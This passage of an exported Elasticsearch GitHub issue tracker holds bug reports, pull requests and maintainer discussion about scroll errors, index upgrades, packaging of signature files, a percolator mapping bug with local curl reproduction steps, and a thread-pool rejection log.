</description><key id="44421817">7926</key><summary>ArrayIndexOutOfBoundsException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">lnxg33k</reporter><labels><label>:Scroll</label><label>bug</label></labels><created>2014-09-30T10:24:49Z</created><updated>2015-08-24T14:48:33Z</updated><resolved>2015-08-24T14:48:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-14T12:21:10Z" id="59033722">Hi @lnxg33k 

Just to note: you shouldn't use such big sizes. The whole point of scrolling is that you can keep pulling smaller batches of results until you have enough.

That said, an NPE is always a bug.  I've tried replicating this with two shards and 300,000 documents, but it is working fine for me.

Could you provide the stack trace from the logs so that we can investigate further?

thanks
</comment><comment author="clintongormley" created="2014-10-23T10:01:13Z" id="60217280">Hi @lnxg33k 

Any chance of getting the stack trace please?
</comment><comment author="lnxg33k" created="2014-10-28T08:21:22Z" id="60722427">@clintongormley I am sorry but I couldn't reporoduce it anymore and don't have the stack trace. 
</comment><comment author="clintongormley" created="2014-10-28T10:28:54Z" id="60735473">OK, thanks @lnxg33k 

I'll close this issue as we have been unable to replicate, but please feel free to reopen if you see it happen again.
</comment><comment author="l15k4" created="2015-06-30T18:55:34Z" id="117301623">There is a stack trace with `ArrayIndexOutOfBounds` that occurs when scrolling, it started after upgrade to 1.6 : 

```
org.elasticsearch.transport.RemoteTransportException: [Book][inet[/172.31.13.26:9300]][indices:data/read/scroll]
Caused by: org.elasticsearch.action.search.ReduceSearchPhaseException: Failed to execute phase [fetch], [reduce] 
    at org.elasticsearch.action.search.type.TransportSearchScrollScanAction$AsyncAction.finishHim(TransportSearchScrollScanAction.java:190) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.action.search.type.TransportSearchScrollScanAction$AsyncAction.access$800(TransportSearchScrollScanAction.java:71) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.action.search.type.TransportSearchScrollScanAction$AsyncAction$1.onResult(TransportSearchScrollScanAction.java:164) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.action.search.type.TransportSearchScrollScanAction$AsyncAction$1.onResult(TransportSearchScrollScanAction.java:159) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.search.action.SearchServiceTransportAction$22.handleResponse(SearchServiceTransportAction.java:533) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.search.action.SearchServiceTransportAction$22.handleResponse(SearchServiceTransportAction.java:524) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:163) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:132) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:337) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42) ~[gwiq.jar:0.6-SNAPSHOT]
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) ~[na:1.7.0_75]
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) ~[na:1.7.0_75]
    at java.lang.Thread.run(Thread.java:745) ~[na:1.7.0_75]
Caused by: java.lang.ArrayIndexOutOfBoundsException: 70
    at org.elasticsearch.action.search.type.TransportSearchScrollScanAction$AsyncAction.innerFinishHim(TransportSearchScrollScanAction.java:209) ~[gwiq.jar:0.6-SNAPSHOT]
    at org.elasticsearch.action.search.type.TransportSearchScrollScanAction$AsyncAction.finishHim(TransportSearchScrollScanAction.java:188) ~[gwiq.jar:0.6-SNAPSHOT]
    ... 29 common frames omitted
```
</comment><comment author="l15k4" created="2015-07-01T08:38:39Z" id="117539927">I'm doing a lot of scrollings  (with sliding time constraint over the same indices) in a for loop. I'll try to clear scroll context after each iteration to see if it helps...
</comment><comment author="clintongormley" created="2015-07-01T08:39:24Z" id="117540266">@l15k4 also, are you using `scan`? and do you have any shard exceptions while scrolling?
</comment><comment author="l15k4" created="2015-07-01T08:44:37Z" id="117542790">@clintongormley Yes I'm doing `scan` with `range` over 110 indices, `page-size=70`, tried `keepAlive=10s-30s`. When I didn't get `ArrayIndexOutOfBoundsException` I got shardFailures, like ~ 10-50 of the same identical failures : 

```
failure.index() == null
failure.shardId == -1`
failure.reason == NodeDisconnectedException
```
</comment><comment author="clintongormley" created="2015-07-01T09:21:04Z" id="117558123">Hi @l15k4 

Thanks for the info.  I've asked @martijnvg to have a look at it when he has a moment.  Any more info that you can provide to help us track it down would be useful.  also, why so many node disconnected exceptions?  that seems weird.  Do you see any exceptions on those nodes?
</comment><comment author="l15k4" created="2015-07-01T09:28:38Z" id="117560800">Imho it was all caused by leaving too many "15s" scroll contexts alive because I wasn't clearing them and I was performing 8760 tiny scans in for loop (sequentially) ... After I deployed the application with `clearing-scroll-context-feature` it works like a charm...

Sorry but those logs were temporary, they are gone with the old docker container...
</comment><comment author="martijnvg" created="2015-07-01T14:20:42Z" id="117691978">@l15k4 Did the errors occur while there were nodes of mixed versions in the cluster? Or were all nodes on the same version?
</comment><comment author="l15k4" created="2015-07-01T14:25:32Z" id="117692969">@martijnvg At the time of the error being thrown all 4 nodes were `1.6.0` but a week ago we managed to run cluster [1.6.0, 1.6.0, 1.6.0, 1.5.1] for 3 hours before we noticed it was having `yellow` status indefinitely... Could it affect future well being of the cluster? 
</comment><comment author="martijnvg" created="2015-07-01T16:16:57Z" id="117734129">@l15k4 no, but I don't recommend to do this is for a long period of time. Not sure what the cause of the exception was here, but I think the code where the exception occurs can be written in such a way that an `ArrayIndexOutOfBoundsException` can never occur.
</comment><comment author="jpountz" created="2015-08-24T14:48:33Z" id="134231363">Fixed via #11978
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs: Added breaking changes docs for Indices APIs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7925</link><project id="" key="" /><description>Adds the breaking changes defaults for the change of default indices options for the GET Aliases API
</description><key id="44418675">7925</key><summary>Docs: Added breaking changes docs for Indices APIs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>docs</label><label>v2.0.0-beta1</label></labels><created>2014-09-30T09:55:25Z</created><updated>2014-10-08T14:11:04Z</updated><resolved>2014-10-08T14:11:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-10-02T22:18:37Z" id="57718803">I think I remember @clintongormley saying that he would rather start this page only when we approach the 2.0 release. @clintongormley is it accurate?
</comment><comment author="jpountz" created="2014-10-08T13:14:40Z" id="58355032">With more and more breaking changes coming, it looks like [more and more people seem to want this page](https://github.com/jpountz/elasticsearch/commit/9845f2976e544f65a6e51991fb3ca8149d4ca315#commitcomment-8082511) so maybe it's time to get it in. +1 to push
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add a finalize round to multicast pinging</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7924</link><project id="" key="" /><description>When sending a multicast ping, there is no way to determine how long it will take before all nodes will respond. Currently we send two pings (one at start, one after half timeout) and wait until the ping timeout has passed for all responses to come back. However, if all nodes are fast to respond, there is a relatively large gap between the moment that pings were gathered and the election that is based on them. This commits adds a last ping round (at timeout) where we know the number of nodes we expect to receive answers from. Once all nodes responded, we complete the pinging.
</description><key id="44407053">7924</key><summary>Add a finalize round to multicast pinging</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-30T07:59:52Z</created><updated>2015-06-07T11:59:46Z</updated><resolved>2014-10-02T13:27:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-30T12:09:08Z" id="57303681">LGTM
</comment><comment author="iopenstack" created="2014-10-02T10:13:27Z" id="57608695">Just curious about the protocol you are implementing, it seems that you want to have a reliable multicast ping. what is the purpose for this ping? 
</comment><comment author="bleskes" created="2014-10-02T13:20:24Z" id="57628087">@iopenstack the multicast based discovery is primarily for development (and ease of) use. It's not recommended for production for the exact reason you stated. That said, we test it and every once while (rare) we out test fail because of this gap. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support of "starts with" when attaching REST handlers</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7923</link><project id="" key="" /><description /><key id="44404701">7923</key><summary>Support of "starts with" when attaching REST handlers</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">templth</reporter><labels><label>discuss</label></labels><created>2014-09-30T07:31:22Z</created><updated>2015-03-19T10:19:04Z</updated><resolved>2015-01-30T09:54:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-01-26T20:36:32Z" id="71533141">@templth - I still can't find a signed CLA for you. Are you sure that you signed the personal CLA, with your github ID and the same email address?
</comment><comment author="templth" created="2015-01-27T08:14:09Z" id="71606677">@clintongormley Really. I got a confirmation email from echosign... I just checked and both github id and email seem correct. Do you want me to send it by email?
</comment><comment author="clintongormley" created="2015-01-27T09:55:05Z" id="71618792">@templth are you sure you signed the personal CLA? The corporate CLAs have to be checked manually unfortunately.  If it was a personal one, please send it to me so that we can figure out why it isn't working.
</comment><comment author="templth" created="2015-01-27T13:08:20Z" id="71644806">@clintongormley I just sent you by email the CLA I signed...
</comment><comment author="clintongormley" created="2015-01-27T14:22:09Z" id="71654801">Corporate CLA signed
</comment><comment author="jpountz" created="2015-01-30T09:54:19Z" id="72177891">An issue I have with this pull request is that the change is not used in the core. Elasticsearch being already quite a large project, we regularly try to remove functionality that is unused to keep the total amount of complexity manageable. So I would lean towards not merging such a change unless it could help simplify the core...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add API to upgrade old Lucene indices to the latest version</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7922</link><project id="" key="" /><description>I'm putting this up now to get early feedback.  I am still working on testing, but the implementation is basically there.  I've also attempted to add docs (and modify optimize docs as necessary).

This branch does the following:
- Add the new API at the rest layer, being backed by the optimize API with upgrade flag, and segments api to find upgrade status.
- Add `upgrade` flag to optimize API, and deprecate `force` flag (will remove in master)

closes #7884
</description><key id="44370734">7922</key><summary>Add API to upgrade old Lucene indices to the latest version</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>:Upgrade API</label><label>feature</label><label>release highlight</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T23:41:06Z</created><updated>2015-06-06T18:19:45Z</updated><resolved>2014-10-07T15:13:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-09-30T13:51:16Z" id="57316313">I'm worried that this (like the optimize api in general) could cause an overwhelming amount of IO.  I'm not really sure what to do about that or if that is even something to be handled by this pull request.  Probably not.
</comment><comment author="s1monw" created="2014-09-30T13:52:38Z" id="57316521">&gt; I'm worried that this (like the optimize api in general) could cause an overwhelming amount of IO. I'm not really sure what to do about that or if that is even something to be handled by this pull request. Probably not.

that is by design, you can't avoid it we already try to minimise it as much as possible by only rewriting the segments rather than merging them in to big-ass segments.
</comment><comment author="nik9000" created="2014-09-30T13:54:21Z" id="57316795">&gt; that is by design, you can't avoid it we already try to minimise it as much as possible by only rewriting the segments rather than merging them in to big-ass segments.

Fair enough.
</comment><comment author="rjernst" created="2014-10-04T04:59:34Z" id="57894822">Ok, I've added a test using the BWC framework.  It checks single/all indexes for both GET and POST, as well as wait_for_completion true and false.
</comment><comment author="s1monw" created="2014-10-06T14:06:57Z" id="58021440">I left some comments, all in all this looks very good. Once question though, we don't commit after the upgrade is done, are we not doing this on purpose or just not in this iteration?
</comment><comment author="rjernst" created="2014-10-06T14:58:29Z" id="58029623">I addressed some of the issues noted.  Regarding the commit, we set the underlying optimize call to do a flush after the merge(s) are complete.
</comment><comment author="s1monw" created="2014-10-07T11:16:48Z" id="58169407">&gt; I addressed some of the issues noted. Regarding the commit, we set the underlying optimize call to do a flush after the merge(s) are complete.

yeah I somehow missed that this was fixed :)
</comment><comment author="s1monw" created="2014-10-07T11:19:39Z" id="58169649">left one comment other than that LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Move forbidden api signature files to dev-tools.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7921</link><project id="" key="" /><description>This avoids the files showing up in the binary release, since .txt files are copied.

closes #7917
</description><key id="44364581">7921</key><summary>Move forbidden api signature files to dev-tools.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>:Packaging</label><label>bug</label><label>v1.3.4</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T22:19:06Z</created><updated>2015-06-08T00:11:08Z</updated><resolved>2014-09-29T22:28:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-29T22:20:06Z" id="57239607">LGTM in addition of fixing the issue, I also find it cleaner!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix optimize behavior with 'force' and 'flush' flags.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7920</link><project id="" key="" /><description>This does the following:
- Make 'force' flag only build a merge if the delegate MP returned no merges
- Add async handling for 'flush' when 'waitForMerges' is false
- Remove flush at the beginning of optimize.  This is something the user can
  do if they wish, before calling optimize.

closes #7886
closes #7904
</description><key id="44351528">7920</key><summary>Fix optimize behavior with 'force' and 'flush' flags.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>:Index APIs</label><label>bug</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T20:25:39Z</created><updated>2015-06-07T18:12:17Z</updated><resolved>2014-09-29T22:27:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-29T22:19:23Z" id="57239532">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Percolator can pick up incorrect field mapper when using _all field in queries</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7919</link><project id="" key="" /><description>If an index contains more than 1 type and contains percolator queries that match the _all field, it is possible/likely to run into a situation where the field mapper used to parse the _all field can be incorrect, thus leading to incorrect/unexpected results.

Steps to reproduce:

```
curl -XDELETE localhost:9200/b

curl -XPUT localhost:9200/b -d '
{
  "settings": {
    "index": {
      "number_of_shards": 1,
      "number_of_replicas": 0
    }
  },
  "mappings": {
    "doc": {
      "_all": {
        "analyzer": "snowball"
      }
    },
    ".percolator": {
      "properties": {
        "name": {
          "type": "string"
        }
      }
    }
  }
}'

curl -XPOST localhost:9200/b/.percolator/1?pretty -d '{
  "name": "test1",
  "query": {
    "match": {
      "_all": "running"
    }
  }
}'

curl -XPOST localhost:9200/_refresh?pretty

#expected to match the above percolator query, but doesn't. reason is because the above percolator query picks up an incorrect mapper for the _all field
curl -XPOST localhost:9200/b/doc/_percolate?pretty -d '{
  "doc": {
    "title": "running"
  }
}'
```
</description><key id="44347104">7919</key><summary>Percolator can pick up incorrect field mapper when using _all field in queries</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bly2k</reporter><labels /><created>2014-09-29T19:50:39Z</created><updated>2014-09-29T20:19:15Z</updated><resolved>2014-09-29T20:19:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bly2k" created="2014-09-29T20:19:15Z" id="57222638">Martijn has suggested that an explicit type to the percolator query can get around this - so perhaps this issue is not critical since a workaround exists. Just a bit confusing if encountered.

```
curl -XPOST localhost:9200/b/.percolator/1?pretty -d '{
  "type": "doc",
  "name": "test1",
  "query": {
    "match": {
      "_all": "running"
    }
  }
}'
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure indices cannot be renamed into restored aliases</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7918</link><project id="" key="" /><description>...ses

Fixes #7915
</description><key id="44343352">7918</key><summary>Make sure indices cannot be renamed into restored aliases</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">imotov</reporter><labels><label>:Snapshot/Restore</label><label>bug</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T19:25:18Z</created><updated>2015-06-08T00:38:03Z</updated><resolved>2014-10-05T18:49:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-10-02T20:19:36Z" id="57698614">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Debian package contains forbidden-apis signatures files in /usr/share/elasticsearch</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7917</link><project id="" key="" /><description>This is how the /usr/share/elasticsearch directory looks like:

```
root@host:/usr/share/elasticsearch# ls -l
total 36
-rw-r--r-- 1 root root   77 Sep 29 13:41 all-signatures.txt
drwxr-xr-x 2 root root 4096 Sep 29 18:10 bin
-rw-r--r-- 1 root root 4441 Sep 29 13:41 core-signatures.txt
drwxr-xr-x 3 root root 4096 Sep 29 18:10 lib
-rw-r--r-- 1 root root  150 Sep 29 13:41 NOTICE.txt
-rw-r--r-- 1 root root 8421 Sep 29 13:41 README.textile
-rw-r--r-- 1 root root    0 Sep 29 13:41 test-signatures.txt
root@pangaea-mw1:/usr/share/elasticsearch#
```

The txt files are relicts caused by packaging *.txt into the debian file. There are two solutions:
- exclude those files explicit from packaging
- alternatively rename those files to something like *.sig and change pom.xml

I prefer the second variant. *.txt is stupid for signatures files. This was just copied from Lucene where they are in a separate subdirectory.
</description><key id="44337958">7917</key><summary>Debian package contains forbidden-apis signatures files in /usr/share/elasticsearch</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uschindler</reporter><labels><label>bug</label><label>build</label><label>v1.3.4</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T18:50:53Z</created><updated>2014-09-30T09:01:27Z</updated><resolved>2014-09-29T22:28:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-09-29T18:54:35Z" id="57209915">+1

Low priority but probably worth it because it can't be that hard.
</comment><comment author="uschindler" created="2014-09-30T07:49:12Z" id="57278557">Thanks. Moving to dev-tools is also fine, somewhat like in lucene :-)
</comment><comment author="s1monw" created="2014-09-30T09:01:27Z" id="57285524">I also ported this to `1.3` and `1.4` branches
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Stats: _status with #shards &gt;&gt; queue capacity failing with BroadcastShardOperationFailedException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7916</link><project id="" key="" /><description>Hi.

While /_status is deprecated and should be replaced with /_recovery, there seems to be a regression between 1.3.2 and 1.3.3 when a cluster has lots of shards.

The /_status-request fails with e.g:

```
"failures" : [ {
      "index" : "foo-0104",
      "shard" : 0,
      "reason" : "BroadcastShardOperationFailedException[[foo-0104][0] ]; nested: EsRejectedExecutionException[rejected execution (queue capacity 100) on org.elasticsearch.action.support.broadcast.TransportBroadcastOperationAction$AsyncBroadcastAction$1@759c850c]; "
    } ]
  }
```

Elasticsearch logs 

```
[2014-09-29 19:05:09,657][DEBUG][action.admin.indices.status] [Sputnik] [foo-0104][0], node[LWIGdaF4QdWwLEz2peydqQ], [P], s[STARTED]: failed to executed [org.elasticsearch.action.admin.indices.status.IndicesStatusRequest@746ef917]
org.elasticsearch.common.util.concurrent.EsRejectedExecutionException: rejected execution (queue capacity 100) on org.elasticsearch.action.support.broadcast.TransportBroadcastOperationAction$AsyncBroadcastAction$1@759c850c
    at org.elasticsearch.common.util.concurrent.EsAbortPolicy.rejectedExecution(EsAbortPolicy.java:62)
    at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:821)
    at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1372)
    at org.elasticsearch.action.support.broadcast.TransportBroadcastOperationAction$AsyncBroadcastAction.performOperation(TransportBroadcastOperationAction.java:166)
    at org.elasticsearch.action.support.broadcast.TransportBroadcastOperationAction$AsyncBroadcastAction.start(TransportBroadcastOperationAction.java:150)
    at org.elasticsearch.action.support.broadcast.TransportBroadcastOperationAction.doExecute(TransportBroadcastOperationAction.java:70)
    at org.elasticsearch.action.support.broadcast.TransportBroadcastOperationAction.doExecute(TransportBroadcastOperationAction.java:46)
    at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:65)
    at org.elasticsearch.client.node.NodeIndicesAdminClient.execute(NodeIndicesAdminClient.java:71)
    at org.elasticsearch.client.support.AbstractIndicesAdminClient.status(AbstractIndicesAdminClient.java:429)
    at org.elasticsearch.rest.action.admin.indices.status.RestIndicesStatusAction.handleRequest(RestIndicesStatusAction.java:62)
    at org.elasticsearch.rest.BaseRestHandler.handleRequest(BaseRestHandler.java:66)
    at org.elasticsearch.rest.RestController.executeHandler(RestController.java:177)
    at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:160)
    at org.elasticsearch.http.HttpServer.internalDispatchRequest(HttpServer.java:121)
    at org.elasticsearch.http.HttpServer$Dispatcher.dispatchRequest(HttpServer.java:83)
    at org.elasticsearch.http.netty.NettyHttpServerTransport.dispatchRequest(NettyHttpServerTransport.java:301)
    at org.elasticsearch.http.netty.HttpRequestHandler.messageReceived(HttpRequestHandler.java:44)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.handler.codec.http.HttpChunkAggregator.messageReceived(HttpChunkAggregator.java:145)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:459)
    at org.elasticsearch.common.netty.handler.codec.replay.ReplayingDecoder.callDecode(ReplayingDecoder.java:536)
    at org.elasticsearch.common.netty.handler.codec.replay.ReplayingDecoder.messageReceived(ReplayingDecoder.java:435)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.OpenChannelsHandler.handleUpstream(OpenChannelsHandler.java:74)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
